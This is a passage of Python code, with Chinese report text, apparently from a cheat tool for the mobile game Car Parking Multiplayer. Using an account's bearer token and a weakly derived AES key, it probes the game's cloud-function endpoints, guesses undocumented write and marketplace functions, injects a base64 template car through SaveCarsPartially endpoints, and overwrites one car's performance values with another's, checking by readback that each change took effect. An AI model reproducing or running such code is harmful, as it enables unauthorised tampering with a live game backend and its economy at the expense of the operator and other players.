                            _sel.add(_pp)
                elif _part:
                    for _pp in _part.split(','):
                        _sel.update(_GROUPS.get(_pp.strip(), (_pp.strip(),)))
                def _want(_t):
                    return (not _sel) or (_t in _sel)
                _uidv = c.uid or ''
                _tv = c.token or ''
                _aes_body = None
                try:
                    _k = ((_uidv[:8] + '12345678').encode('utf-8'))[:16]
                    _enc = base64.b64encode(aes_cbc_encrypt(b'{}', _k, _k)).decode('ascii')
                    _aes_body = {'data': _enc}
                except Exception:
                    _aes_body = None
                _got = False
                _gid = ''
                _wmem = ''
                _wslist5 = None
                _ep9 = None
                _fn9 = None
                _u9 = str(c.record.get('localID') or '') or _uidv[:8]
                try:
                    _cids = c.record.get('carIDnStatus') or {}
                    _gen = (_cids.get('carGeneratedIDs') or []) if isinstance(_cids, dict) else []
                    report.append('账号: %s | 车库非空: %d' % (c.record.get('Name') or '?', len([x for x in _gen if str(x)])))
                except Exception:
                    pass
                if _want('1'):
                    report.append('--- (1) 读档接口完整响应 ---')
                    try:
                        if c.get_auth():
                            r0 = http_post(URL_GET, {'data': None}, headers={'Authorization': 'Bearer ' + c.token}, timeout=30)
                            if isinstance(r0, dict):
                                for k in list(r0.keys()):
                                    v = r0[k]
                                    if isinstance(v, str):
                                        report.append('  [%s] str len=%d head=%s' % (k, len(v), repr(v[:70])))
                                    elif isinstance(v, dict):
                                        report.append('  [%s] dict keys=%s' % (k, list(v.keys())[:15]))
                                    elif isinstance(v, list):
                                        report.append('  [%s] list len=%d head=%s' % (k, len(v), repr(json.dumps(v[:1], ensure_ascii=False)[:100])))
                                    else:
                                        report.append('  [%s] %s' % (k, repr(v)[:80]))
                            else:
                                report.append('  响应异常: %s' % str(r0)[:200])
                        else:
                            report.append('  登录态失效')
                    except Exception as e:
                        report.append('  读档异常: %s' % str(e)[:150])
                if _want('2'):
                    report.append('--- (2) 车辆数据通道探测 ---')
                    _uidv = c.uid or ''
                    _tv = c.token or ''
                    _aes_body = None
                    try:
                        _k = ((_uidv[:8] + '12345678').encode('utf-8'))[:16]
                        _enc = base64.b64encode(aes_cbc_encrypt(b'{}', _k, _k)).decode('ascii')
                        _aes_body = {'data': _enc}
                        report.append('  [AES] 会话加密体已生成')
                    except Exception as _ea:
                        report.append('  [AES] 加密失败：%s' % str(_ea)[:80])
                    _bases = ['https://europe-west1-cp-multiplayer.cloudfunctions.net',
                              'https://us-central1-cp-multiplayer.cloudfunctions.net',
                              'https://us-central1-carparkingmultiplayer-dc1d2.cloudfunctions.net']
                    _got = False
                    for _b in _bases:
                        if _got or _aes_body is None:
                            break
                        _btag = _b.split('//')[1][:36]
                        try:
                            r4 = http_post(_b + '/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=12)
                            _res4 = r4.get('result') if isinstance(r4, dict) else None
                            if isinstance(_res4, str):
                                try:
                                    _res4 = json.loads(_res4)
                                except Exception:
                                    pass
                            if isinstance(_res4, list):
                                report.append('  [GetAllCars2 @%s] OK: list len=%d' % (_btag, len(_res4)))
                                report.append('  [身份] uid前缀8=%s | localID=%s' % ((_uidv[:8] or '').upper(), str(c.record.get('localID') or '')))
                                try:
                                    _cids2e = c.record.get('carIDnStatus') or {}
                                    _gens2e = (_cids2e.get('carGeneratedIDs') or []) if isinstance(_cids2e, dict) else []
                                    _non2e = [str(x) for x in _gens2e if str(x or '').strip()]
                                    report.append('  [全部 genID] 共 %d 条：' % len(_non2e))
                                    for _i2e in range(0, len(_non2e), 8):
                                        report.append('    ' + ' | '.join(_non2e[_i2e:_i2e + 8]))
                                except Exception as _g2e:
                                    report.append('  [全genID] ERR %s' % str(_g2e)[:80])
                                _full9 = 0
                                _lite9 = 0
                                _n9 = 0
                                for _c9 in _res4:
                                    if not isinstance(_c9, dict):
                                        continue
                                    _hasv9 = bool(_c9.get('Vynils'))
                                    if _hasv9:
                                        _full9 += 1
                                    else:
                                        _lite9 += 1
                                    if _n9 < 6:
                                        _n9 += 1
                                        report.append('    车%d CarID=%s V=%s W=%s keys=%s' % (
                                            _n9, str(_c9.get('CarID'))[:12],
                                            ('Y' if _hasv9 else 'N'), ('Y' if _c9.get('WindowVinyls') else 'N'),
                                            list(_c9.keys())[:16]))
                                        try:
                                            _vyp9 = json.dumps(_c9.get('Vynils'), ensure_ascii=False)[:110]
                                        except Exception:
                                            _vyp9 = '?'
                                        report.append('      Vynils=%s' % _vyp9)
                                        try:
                                            _vec9 = _c9.get('vectors')
                                            if isinstance(_vec9, str):
                                                _vcp9 = 'STR[%d]:%s' % (len(_vec9), _vec9[:70])
                                            else:
                                                _vcp9 = json.dumps(_vec9, ensure_ascii=False)[:110]
                                        except Exception:
                                            _vcp9 = '?'
                                        report.append('      vectors=%s' % _vcp9)
                                report.append('    统计：有贴纸 %d 辆 / 无贴纸 %d 辆' % (_full9, _lite9))
                                for _vv in ('full', 1, True):
                                    try:
                                        _vr = http_post(_b + '/GetAllCars2', {'data': _vv}, headers={'Authorization': 'Bearer ' + _tv}, timeout=12)
                                        _vrv = _vr.get('result') if isinstance(_vr, dict) else None
                                        for _u in range(2):
                                            if isinstance(_vrv, str):
                                                try:
                                                    _vrv = json.loads(_vrv)
                                                except Exception:
                                                    break
                                        _vlen = len(_vrv) if isinstance(_vrv, list) else ('str%d' % len(_vrv) if isinstance(_vrv, str) else 'none')
                                        report.append('    data=%r -> %s' % (_vv, _vlen))
                                    except Exception as _ve:
                                        report.append('    data=%r -> ERR %s' % (_vv, str(_ve)[:60]))
                                _got = True
                            else:
                                _pv = json.dumps(r4, ensure_ascii=False)[:140] if isinstance(r4, dict) else str(r4)[:140]
                                report.append('  [GetAllCars2 @%s] -> %s' % (_btag, _pv))
                        except Exception as _ex:
                            report.append('  [GetAllCars2 @%s] ERR %s' % (_btag, str(_ex)[:90]))
                    if not _got and _aes_body is not None:
                        report.append('  [GetAllCars2] 三域均未取到列表')
                if _want('2b'):
                    report.append('--- (2b) WSGetCarListV3 车市列表探测 ---')
                    try:
                        _wsr = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3', {'data': 20}, headers={'Authorization': 'Bearer ' + _tv}, timeout=15)
                        _wsv = _wsr.get('result') if isinstance(_wsr, dict) else None
                        for _u in range(3):
                            if isinstance(_wsv, str):
                                try:
                                    _wsv = json.loads(_wsv)
                                except Exception:
                                    break
                        if isinstance(_wsv, list) and _wsv:
                            report.append('    槽位 %d 个' % len(_wsv))
                            if isinstance(_wsv[0], dict):
                                report.append('    首条 keys=%s' % list(_wsv[0].keys())[:22])
                                report.append('    首条预览: %s' % json.dumps(_wsv[0], ensure_ascii=False)[:260])
                        else:
                            _wss = json.dumps(_wsr, ensure_ascii=False)[:180] if isinstance(_wsr, dict) else str(_wsr)[:180]
                            report.append('    返回: %s' % _wss)
                    except Exception as _wse:
                        report.append('    ERR %s' % str(_wse)[:90])
                if _want('3'):
                    report.append('--- (3) 写车函数探测（空数据） ---')
                    try:
                        _ebase = 'https://europe-west1-cp-multiplayer.cloudfunctions.net'
                        _wnames = ['GetAllCars1', 'GetAllCars3', 'SaveCar2', 'SaveCar', 'UpdateCar2',
                                   'SetCar2', 'SaveCarData2', 'SaveGarage2', 'SyncCar2', 'SaveCars2']
                        for _wn in _wnames:
                            try:
                                _wr = http_post(_ebase + '/' + _wn, _aes_body if _aes_body is not None else {'data': None},
                                                headers={'Authorization': 'Bearer ' + _tv}, timeout=10)
                                if isinstance(_wr, dict):
                                    _ws = json.dumps(_wr, ensure_ascii=False)[:150]
                                else:
                                    _ws = str(_wr)[:150]
                                report.append('  [%s] -> %s' % (_wn, _ws))
                            except Exception as _we:
                                report.append('  [%s] -> ERR %s' % (_wn, str(_we)[:90]))
                    except Exception as _we2:
                        report.append('  [写车探测] 外层 %s' % str(_we2)[:90])
                if _want('4'):
                    report.append('--- (4) 车市函数族探测 ---')
                    try:
                        _ebase4 = 'https://europe-west1-cp-multiplayer.cloudfunctions.net'
                        _f4names = ['WSGetFullCarV3', 'WSGetCarIDnStatusV3', 'WSGetMySellingCarsV3',
                                    'WSGetDeletedCarListV3', 'WSGetCarListWwV3', 'WSTryPurchaseCarV3',
                                    'WSSellCarV3', 'WSCancelSellCarV3', 'WSBuyCarSlotV3',
                                    'WSGetFullCar', 'WSSellCar', 'WSGetMySellingCars',
                                    'WSGetCarListV3', 'WSPurchaseCarV3']
                        for _fn4 in _f4names:
                            try:
                                _r4 = http_post(_ebase4 + '/' + _fn4, {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=10)
                                if isinstance(_r4, dict):
                                    _s4 = json.dumps(_r4, ensure_ascii=False)[:150]
                                else:
                                    _s4 = str(_r4)[:150]
                                report.append('  [%s] -> %s' % (_fn4, _s4))
                            except Exception as _e4:
                                report.append('  [%s] -> ERR %s' % (_fn4, str(_e4)[:80]))
                    except Exception as _e44:
                        report.append('  [车市族] 外层 %s' % str(_e44)[:80])
                if _want('5'):
                    report.append('--- (5) WSGetFullCarV3 参数试错 ---')
                    try:
                        _cids5 = c.record.get('carIDnStatus') or {}
                        _gen5 = (_cids5.get('carGeneratedIDs') or []) if isinstance(_cids5, dict) else []
                        _gid = ''
                        for _g in _gen5:
                            if str(_g or '').strip():
                                _gid = str(_g).strip()
                                break
                        report.append('  样本车标识: %s' % _gid)
                        _tries5 = [
                            ('str', _gid),
                            ('list', [_gid]),
                            ('obj.carGeneratedID', {'carGeneratedID': _gid}),
                            ('obj.id', {'id': _gid}),
                            ('obj.carId', {'carId': _gid}),
                            ('obj.carGeneratedIDs', {'carGeneratedIDs': [_gid]}),
                        ]
                        for _tag5, _p5 in _tries5:
                            try:
                                _r5 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetFullCarV3', {'data': _p5}, headers={'Authorization': 'Bearer ' + _tv}, timeout=12)
                                _s5 = json.dumps(_r5, ensure_ascii=False)[:200] if isinstance(_r5, dict) else str(_r5)[:200]
                                report.append('  [%s] -> %s' % (_tag5, _s5))
                            except Exception as _e5:
                                report.append('  [%s] -> ERR %s' % (_tag5, str(_e5)[:80]))
                    except Exception as _e55:
                        report.append('  [试错] 外层 %s' % str(_e55)[:80])
                if _want('5b'):
                    report.append('--- (5b) GetFullCar 补充试错 ---')
                    try:
                        _wslist5 = None
                        try:
                            _r5w = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3', {'data': 20}, headers={'Authorization': 'Bearer ' + _tv}, timeout=15)
                            _v5w = _r5w.get('result') if isinstance(_r5w, dict) else None
                            for _u in range(2):
                                if isinstance(_v5w, str):
                                    try:
                                        _v5w = json.loads(_v5w)
                                    except Exception:
                                        break
                            _wslist5 = _v5w
                        except Exception:
                            _wslist5 = None
                        _wmem = ''
                        if isinstance(_wslist5, list) and _wslist5 and isinstance(_wslist5[0], dict):
                            _wmem = str(_wslist5[0].get('carGeneratedID') or '')
                        report.append('  车市样本 ID: %s' % _wmem)
                        _tries5b = []
                        if _wmem:
                            _tries5b.append(('ws.str', _wmem))
                        if _gid:
                            _tries5b.append(('main.nov1', _gid.rsplit('_', 1)[0]))
                            _tries5b.append(('main.mid', _gid.split('_')[1] if '_' in _gid else ''))
                        for _tag5b, _p5b in _tries5b:
                            if not _p5b:
                                continue
                            try:
                                _r5b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetFullCarV3', {'data': _p5b}, headers={'Authorization': 'Bearer ' + _tv}, timeout=12)
                                _s5b = json.dumps(_r5b, ensure_ascii=False)[:200] if isinstance(_r5b, dict) else str(_r5b)[:200]
                                report.append('  [%s] -> %s' % (_tag5b, _s5b))
                            except Exception as _e5b:
                                report.append('  [%s] -> ERR %s' % (_tag5b, str(_e5b)[:80]))
                    except Exception as _e5b2:
                        report.append('  [5b] 外层 %s' % str(_e5b2)[:80])
                    report.append('--- (5c) GetFullCar JSON 包裹试错 ---')
                    try:
                        _tries5c = []
                        if _gid:
                            _tries5c.append(('j.main.carGeneratedID', json.dumps({'carGeneratedID': _gid})))
                            _tries5c.append(('j.main.carID', json.dumps({'carID': _gid})))
                            _tries5c.append(('j.main.id', json.dumps({'id': _gid})))
                        if _wmem:
                            _tries5c.append(('j.ws.carGeneratedID', json.dumps({'carGeneratedID': _wmem})))
                            _tries5c.append(('j.ws.carID', json.dumps({'carID': _wmem})))
                            _tries5c.append(('j.ws.id', json.dumps({'id': _wmem})))
                        for _tag5c, _p5c in _tries5c:
                            try:
                                _r5c = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetFullCarV3', {'data': _p5c}, headers={'Authorization': 'Bearer ' + _tv}, timeout=12)
                                _s5c = json.dumps(_r5c, ensure_ascii=False)[:220] if isinstance(_r5c, dict) else str(_r5c)[:220]
                                report.append('  [%s] -> %s' % (_tag5c, _s5c))
                            except Exception as _e5c:
                                report.append('  [%s] -> ERR %s' % (_tag5c, str(_e5c)[:80]))
                    except Exception as _e5c2:
                        report.append('  [5c] 外层 %s' % str(_e5c2)[:80])
                if _want('7'):
                    report.append('--- (7) 车市条目完整样本深挖 ---')
                    try:
                        _found7 = 0
                        if isinstance(_wslist5, list):
                            for _w7 in _wslist5[:20]:
                                if not isinstance(_w7, dict):
                                    continue
                                _td7 = _w7.get('thisCarData')
                                _tv7 = _w7.get('thisCarVynils')
                                if _td7 is None and _tv7 is None:
                                    continue
                                _found7 += 1
                                report.append('  [条目] genID=%s carID=%s' % (str(_w7.get('carGeneratedID'))[:40], str(_w7.get('carID'))[:10]))
                                if _td7 is not None:
                                    _sd7 = json.dumps(_td7, ensure_ascii=False) if not isinstance(_td7, str) else _td7
                                    report.append('    thisCarData: %s' % _sd7[:300])
                                if _tv7 is not None:
                                    _sv7 = json.dumps(_tv7, ensure_ascii=False) if not isinstance(_tv7, str) else _tv7
                                    report.append('    thisCarVynils: %s' % _sv7[:300])
                                if _found7 >= 3:
                                    break
                        report.append('  非空条目数: %d' % _found7)
                    except Exception as _e72:
                        report.append('  [7] 外层 %s' % str(_e72)[:80])
                if _want('7b'):
                    report.append('--- (7b) 车市条目原文 ---')
                    try:
                        if isinstance(_wslist5, list):
                            for _i7, _w7b in enumerate(_wslist5[:3]):
                                report.append('  [条%d] %s' % (_i7 + 1, json.dumps(_w7b, ensure_ascii=False)[:700]))
                        else:
                            report.append('  (无列表)')
                    except Exception as _e7b:
                        report.append('  [7b] 外层 %s' % str(_e7b)[:80])
                if _want('8'):
                    report.append('--- (8) WSSellCarV3 挂售试错 ---')
                    try:
                        _gid8 = _gid or ''
                        if not _gid8:
                            report.append('  无可用车标识')
                        else:
                            _tries8 = [
                                ('j.a', json.dumps({'carGeneratedID': _gid8, 'price': 1000})),
                                ('j.b', json.dumps({'carID': _gid8, 'price': 1000})),
                                ('j.c', json.dumps({'id': _gid8, 'price': 1000})),
                                ('j.d', json.dumps({'carGeneratedID': _gid8, 'price': 1000, 'mode': 1})),
                                ('raw', _gid8),
                            ]
                            for _tag8, _p8 in _tries8:
                                try:
                                    _r8 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSSellCarV3', {'data': _p8}, headers={'Authorization': 'Bearer ' + _tv}, timeout=15)
                                    _s8 = json.dumps(_r8, ensure_ascii=False)[:180] if isinstance(_r8, dict) else str(_r8)[:180]
                                    report.append('  [%s] -> %s' % (_tag8, _s8))
                                    if isinstance(_r8, dict) and str(_r8.get('result')) not in ('0', 'None', ''):
                                        break
                                except Exception as _e8:
                                    report.append('  [%s] -> ERR %s' % (_tag8, str(_e8)[:80]))
                    except Exception as _e82:
                        report.append('  [8] 外层 %s' % str(_e82)[:80])
                if _want('9'):
                    report.append('--- (9) SaveCarsPartially5 写测试 ---')
                    try:
                        _u9 = str(c.record.get('localID') or '') or (c.uid or '')[:8]
                        _ep9 = None
                        _fn9 = None
                        for _b9 in ['https://europe-west1-cp-multiplayer.cloudfunctions.net',
                                    'https://us-central1-cp-multiplayer.cloudfunctions.net']:
                            for _n9 in ['SaveCarsPartially8', 'SaveCarsPartially7', 'SaveCarsPartially6', 'SaveCarsPartially5']:
                                if _ep9:
                                    break
                                try:
                                    _r9p = http_post(_b9 + '/' + _n9, {'data': ''}, headers={'Authorization': 'Bearer ' + _tv}, timeout=12)
                                    _s9p = json.dumps(_r9p, ensure_ascii=False)[:110] if isinstance(_r9p, dict) else str(_r9p)[:110]
                                    _hit9 = ('404' not in _s9p)
                                    report.append('  [探] %s.%s -> %s' % (_b9.split('//')[1].split('.')[0][:12], _n9, _s9p))
                                    if _hit9 and _ep9 is None:
                                        _ep9 = _b9
                                        _fn9 = _n9
                                except Exception as _e9p:
                                    report.append('  [探] %s.%s -> ERR %s' % (_b9.split('//')[1].split('.')[0][:12], _n9, str(_e9p)[:60]))
                        if not _ep9:
                            report.append('  两个域都没找到 SaveCarsPartially5')
                        else:
                            _cr9 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _cv9 = _cr9.get('result') if isinstance(_cr9, dict) else None
                            for _u in range(2):
                                if isinstance(_cv9, str):
                                    try:
                                        _cv9 = json.loads(_cv9)
                                    except Exception:
                                        break
                            _pick9 = None
                            if isinstance(_cv9, list):
                                for _c99 in _cv9:
                                    if isinstance(_c99, dict):
                                        _v99 = _c99.get('vectors')
                                        if isinstance(_v99, list) and _v99 and isinstance(_v99[0], dict):
                                            _pick9 = _c99
                                            break
                            if not _pick9:
                                report.append('  无明文车——改用模板车（k1p1k 样式）')
                                _TPL9 = 'eyJDYXJJRCI6cmVwbGFjZWNhciwiZGF0YVZlcnNpb24iOjIsInZlY3RvcnMiOlt7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9XSwiZmxvYXRzIjpbMC4wLDgxNi4wLDU1MDAuMCwyNjAuMCwxNDAwLjAsMC4wLDAuMCwxLjAsMS4wLDY4LjAsMC4yMiwwLjIyLDQwMDAwLjAsNDAwMDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMCwzMy4wLDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDIuMCwyLjAsMC41LDAuMCwwLjAsMC4wLDEuMCwxLjAsMS4wLDEuMCwxNTAwLjAsMS4wLDAuMCwwLjAsNjguMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMF0sImdlYXJzIjpbMy4yLDEuOTEsMS41MywxLjI3LDAuOSwwLjYsMC40NSw1LjBdLCJ0eXBlVG9JbnN0YWxsIjpbLTIsLTIsLTIsLTIsLTIsLTIsLTIsLTJdLCJCb3VnaHRQYXJ0cyI6WzAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMF0sInRleHRzIjpbIiIsIiIsInJlcGxhY2VpZF9yZXBsYWNlY2FySlgzMzUiLCIiXSwiZmxhZ0lEIjotMSwiZnNvRGF0YSI6Wy0xLDAsMjU1LDI1NSwyNTUsMjU1LDI1NSwyNTVdLCJpbnN0YWxsZWRQb2xpY2VMaWdodHMiOlstMSwtMSwtMSwtMSwtMV0sIlZ5bmlscyI6eyJhbGxWeW5pbHMiOltdLCJDYXJJRCI6cmVwbGFjZWNhcn19'
                                _s9t = base64.b64decode(_TPL9).decode('utf-8')
                                _s9t = _s9t.replace('replacecar', '5').replace('replaceid', _u9)
                                _car9 = json.loads(_s9t)
                                _pl9 = json.dumps(_car9, ensure_ascii=False)
                                report.append('  模板车: CarID=5 texts=%s 长度=%d' % (json.dumps(_car9.get('texts'), ensure_ascii=False)[:80], len(_pl9)))
                                _w9 = http_post(_ep9 + '/' + _fn9, {'data': _pl9}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                _s9 = json.dumps(_w9, ensure_ascii=False)[:200] if isinstance(_w9, dict) else str(_w9)[:200]
                                report.append('  模板写入响应: %s' % _s9)
                                try:
                                    time.sleep(1)
                                    _cr93 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                    _cv93 = _cr93.get('result') if isinstance(_cr93, dict) else None
                                    for _u in range(2):
                                        if isinstance(_cv93, str):
                                            try:
                                                _cv93 = json.loads(_cv93)
                                            except Exception:
                                                break
                                    report.append('  模板写入后车辆数: %s (原 %s)' % (len(_cv93) if isinstance(_cv93, list) else '?', len(_cv9) if isinstance(_cv9, list) else '?'))
                                except Exception:
                                    pass
                            else:
                                _rnd9 = hashlib.md5((_u9 + str(time.time())).encode()).hexdigest()[:5].upper()
                                _car9 = json.loads(json.dumps(_pick9, ensure_ascii=False))
                                _cid9 = int(_car9.get('CarID') or 0)
                                _inst9 = '%s_%s%s' % (_u9, _cid9, _rnd9)
                                _t9 = _car9.get('texts')
                                if isinstance(_t9, list) and len(_t9) >= 3:
                                    _t9[2] = _inst9
                                else:
                                    _car9['texts'] = ['', '', _inst9, '']
                                if isinstance(_car9.get('Vynils'), dict):
                                    _car9['Vynils']['CarID'] = _cid9
                                _pl9 = json.dumps(_car9, ensure_ascii=False)
                                report.append('  测试车 CarID=%s 新标识=%s JSON长度=%d' % (_cid9, _inst9, len(_pl9)))
                                _w9 = http_post(_ep9 + '/' + _fn9, {'data': _pl9}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                _s9 = json.dumps(_w9, ensure_ascii=False)[:200] if isinstance(_w9, dict) else str(_w9)[:200]
                                report.append('  写入响应: %s' % _s9)
                                try:
                                    time.sleep(1)
                                    _cr92 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                    _cv92 = _cr92.get('result') if isinstance(_cr92, dict) else None
                                    for _u in range(2):
                                        if isinstance(_cv92, str):
                                            try:
                                                _cv92 = json.loads(_cv92)
                                            except Exception:
                                                break
                                    report.append('  写入后车辆数: %s (原 %s)' % (len(_cv92) if isinstance(_cv92, list) else '?', len(_cv9) if isinstance(_cv9, list) else '?'))
                                except Exception:
                                    pass
                    except Exception as _e92:
                        report.append('  [9] 外层 %s' % str(_e92)[:110])
                if _want('10'):
                    report.append('--- (10) 对已有车的 SaveCars 改写测试 ---')
                    try:
                        _cr10 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                        _cv10 = _cr10.get('result') if isinstance(_cr10, dict) else None
                        for _u in range(2):
                            if isinstance(_cv10, str):
                                try:
                                    _cv10 = json.loads(_cv10)
                                except Exception:
                                    break
                        _pick10 = None
                        if isinstance(_cv10, list):
                            for _c10 in _cv10:
                                if isinstance(_c10, dict) and _c10.get('texts'):
                                    _pick10 = _c10
                                    break
                        if not _pick10:
                            report.append('  没有可测车（texts 空）')
                        else:
                            _car10 = json.loads(json.dumps(_pick10, ensure_ascii=False))
                            _t10 = _car10.get('texts')
                            _oldmark = ''
                            _ok10 = False
                            if isinstance(_t10, list) and len(_t10) >= 3 and isinstance(_t10[2], str) and _t10[2]:
                                _oldmark = str(_t10[2])
                                _t10[2] = _oldmark + 'Z'
                                _ok10 = True
                            if not _ok10:
                                report.append('  texts 结构不支持改标')
                            else:
                                _pl10 = json.dumps(_car10, ensure_ascii=False)
                                report.append('  原标识: %s → 改为: %s' % (_oldmark[:40], (_oldmark + 'Z')[:40]))
                                _w10 = http_post(_ep9 + '/' + _fn9, {'data': _pl10}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                _s10 = json.dumps(_w10, ensure_ascii=False)[:180] if isinstance(_w10, dict) else str(_w10)[:180]
                                report.append('  改写响应: %s' % _s10)
                                try:
                                    time.sleep(1)
                                    _cr10b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                    _cv10b = _cr10b.get('result') if isinstance(_cr10b, dict) else None
                                    for _u in range(2):
                                        if isinstance(_cv10b, str):
                                            try:
                                                _cv10b = json.loads(_cv10b)
                                            except Exception:
                                                break
                                    _found10 = False
                                    if isinstance(_cv10b, list):
                                        for _c10b in _cv10b:
                                            if isinstance(_c10b, dict):
                                                _t10b = _c10b.get('texts')
                                                if isinstance(_t10b, list) and len(_t10b) >= 3 and isinstance(_t10b[2], str) and _t10b[2].endswith('Z'):
                                                    _found10 = True
                                                    break
                                    report.append('  回读: %s' % ('标识已改变（SaveCars 能改车！）' if _found10 else '标识未变（写入没生效）'))
                                except Exception:
                                    pass
                    except Exception as _e10:
                        report.append('  [10] 外层 %s' % str(_e10)[:110])
                if _want('12'):
                    report.append('--- (12) floats 字段改写自测（B→B）---')
                    try:
                        _c12 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                        _v12 = _c12.get('result') if isinstance(_c12, dict) else None
                        for _u in range(2):
                            if isinstance(_v12, str):
                                try:
                                    _v12 = json.loads(_v12)
                                except Exception:
                                    break
                        _pick12a = None
                        _pick12b = None
                        if isinstance(_v12, list):
                            _cands12 = [c for c in _v12 if isinstance(c, dict) and c.get('floats') is not None and c.get('texts')]
                            if len(_cands12) >= 2:
                                _pick12a = _cands12[0]
                                for _cc in _cands12[1:]:
                                    if json.dumps(_cc.get('floats'), ensure_ascii=False) != json.dumps(_pick12a.get('floats'), ensure_ascii=False):
                                        _pick12b = _cc
                                        break
                                if _pick12b is None:
                                    _pick12b = _cands12[1]
                        if not _pick12a or not _pick12b:
                            report.append('  没有足够车辆做自测')
                        else:
                            _m12 = json.loads(json.dumps(_pick12a, ensure_ascii=False))
                            _oldf = json.dumps(_m12.get('floats'), ensure_ascii=False)
                            _newf = _pick12b.get('floats')
                            _m12['floats'] = _newf
                            _pl12 = json.dumps(_m12, ensure_ascii=False)
                            report.append('  车A(CarID=%s) 用 车B(CarID=%s) 的 floats 覆盖' % (str(_pick12a.get('CarID')), str(_pick12b.get('CarID'))))
                            _w12 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8', {'data': _pl12}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                            _s12 = json.dumps(_w12, ensure_ascii=False)[:160] if isinstance(_w12, dict) else str(_w12)[:160]
                            report.append('  改写响应: %s' % _s12)
                            time.sleep(1)
                            _c12b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _v12b = _c12b.get('result') if isinstance(_c12b, dict) else None
                            for _u in range(2):
                                if isinstance(_v12b, str):
                                    try:
                                        _v12b = json.loads(_v12b)
                                    except Exception:
                                        break
                            _nowf = None
                            if isinstance(_v12b, list):
                                for _c12c in _v12b:
                                    if isinstance(_c12c, dict):
                                        _t12 = _c12c.get('texts')
                                        _t12a = _pick12a.get('texts')
                                        if isinstance(_t12, list) and isinstance(_t12a, list) and len(_t12) >= 3 and len(_t12a) >= 3 and str(_t12[2]) == str(_t12a[2]):
                                            _nowf = json.dumps(_c12c.get('floats'), ensure_ascii=False)
                                            break
                            _wantf = json.dumps(_newf, ensure_ascii=False)
                            if _nowf is None:
                                report.append('  回读: 未找到车A')
                            else:
                                _eq12 = (_nowf == _wantf)
                                report.append('  回读: floats %s（旧头 %s / 现头 %s）' % ('已改变 ✓' if _eq12 else '未改变 ✗', _oldf[:40], _nowf[:40]))
                    except Exception as _e12:
                        report.append('  [12] 外层 %s' % str(_e12)[:110])
                if _want('13') or _want('13a') or _want('13b'):
